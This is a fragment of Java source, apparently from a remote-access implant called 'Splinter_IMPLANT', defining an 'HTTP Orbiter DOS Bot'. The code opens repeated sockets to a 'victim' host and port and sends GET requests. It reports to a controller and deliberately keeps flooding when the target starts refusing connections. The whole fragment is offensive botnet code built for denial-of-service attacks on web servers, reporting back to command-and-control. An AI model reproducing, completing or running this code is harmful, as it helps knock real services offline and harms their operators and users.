		public HTTP_Object(String victimNet, int victimPrt, Splinter_IMPLANT parent)
		{
			try
			{
				implant = parent;
				
				victimAddress = victimNet;
				
				victimPort = victimPrt;
				
				if(victimPort < 1 || victimPort > 65534)
				{
					Driver.sop("Victim port [" + victimPort + "] is out of range, defaulting to port 80");
					this.sendToController("Victim port [" + victimPort + "] is out of range, defaulting to port 80");
					victimPort = 80;
				}
				
				/*if(victimURL != null && !victimURL.toLowerCase().startsWith("http://"))
				{
					victimURL = "http://" + victimURL;
				}*/
				
				errorDetectedDuringInitiation = this.instantiate_HTTP_Socket_GET();
				
			}
			catch(Exception e)
			{
				Driver.eop("Constructor", myClassName, e, "", false);
			}
		}
		
		
		public boolean instantiate_HTTP_Socket_GET() 
		{
			try
			{
				//Driver.sop("Attempting to establish socket to: " + this.victimAddress + " : " + this.victimPort);
				
				//establish socket
				mySocket = new Socket(this.victimAddress, this.victimPort);
				
				//input from implant
				//brIn = new BufferedReader(new InputStreamReader(mySocket.getInputStream()));
				
				//output to implant
				pwOut = new PrintWriter(new BufferedOutputStream(mySocket.getOutputStream()));
				
				//Streams opened
				//Drivers.sop("Streams opened");
				
				sendInitialGetCommand();
				
				String line = "";
				/*while((line = brIn.readLine()) != null )
				{
					Driver.sop(line);
				}*/
				
			}
			catch(ConnectException ce)
			{
				//these exceptions are usually generated when "Connection refused is encountered!!!!" --> thus the DOS
				try
				{
					if(implant != null && !informedControllerOfDOS)
					{
						implant.sendToController("HTTP Orbiter DOS Bot: \"Connection refused detected!!!!", false, true);
						informedControllerOfDOS = true;
					}
					
					if(!informedSOP_Of_DOS)
					{
						Driver.sop("HTTP Orbiter DOS Bot: \"Connection refused detected!!!!");
						informedSOP_Of_DOS = true;
					}
					
				}catch(Exception ee){}
				
				//return true here, bcs, we don't want to stop the DOS at this point!
				return true;
			}
			catch(UnknownHostException uhe)
			{
				implant.sendToController("Invalid HTTP DOS Site specified. Terminating now...", false, false);
				errorDetectedDuringInitiation = true;
				return false;
			}
			catch(Exception e)
			{
				Driver.eop("instantiate_HTTP_Socket", myClassName, e, "", false);
				
			}
			
			return false;
		}
		
